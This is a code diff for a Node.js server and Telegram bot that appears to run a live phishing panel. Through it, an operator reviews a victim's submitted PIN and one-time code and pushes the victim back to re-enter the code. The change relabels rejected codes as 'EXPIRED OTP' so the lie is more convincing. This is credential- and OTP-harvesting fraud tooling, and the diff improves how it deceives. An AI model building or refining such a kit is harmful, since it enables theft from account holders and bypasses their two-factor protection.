@@ -116,10 +116,10 @@ async function initBot() {
           session.status = 'PROCEED_OTP';
           await bot.sendMessage(chatTarget, `✅ Umeingia vizuri (ALLOW). Mteja ameelekezwa kwenye hatua ya OTP.`);
           break;
-        case 'WRONG_OTP':
+        case 'EXPIRED_OTP':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `❌ OTP imekataliwa (WRONG OTP). Mteja anapaswa kuweka OTP upya.`);
+          await bot.sendMessage(chatTarget, `❌ OTP imekataliwa / Imeisha muda wake (EXPIRED OTP). Mteja anapaswa kuweka OTP upya.`);
           break;
         case 'REQUEST_NEW_OTP':
           session.status = 'REQUEST_NEW_OTP';
@@ -195,7 +195,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 6-digit OTP -> Title: **OTP VERIFICATION** accompanied by applicant phone number
+// Step 2: Submit 6-digit OTP -> Title: **OTP VERIFICATION** accompanied by applicant phone number and EXPIRED OTP button
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -216,7 +216,7 @@ app.post('/api/submit-otp', async (req, res) => {
         inline_keyboard: [
           [
             { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
-            { text: 'WRONG OTP ❌', callback_data: `WRONG_OTP_${userId}` },
+            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
             { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
           ]
         ]
@@ -251,7 +251,7 @@ app.post('/api/request-new-otp', async (req, res) => {
         inline_keyboard: [
           [
             { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
-            { text: 'WRONG OTP ❌', callback_data: `WRONG_OTP_${userId}` },
+            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
             { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
           ]
         ]
@@ -270,4 +270,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+    
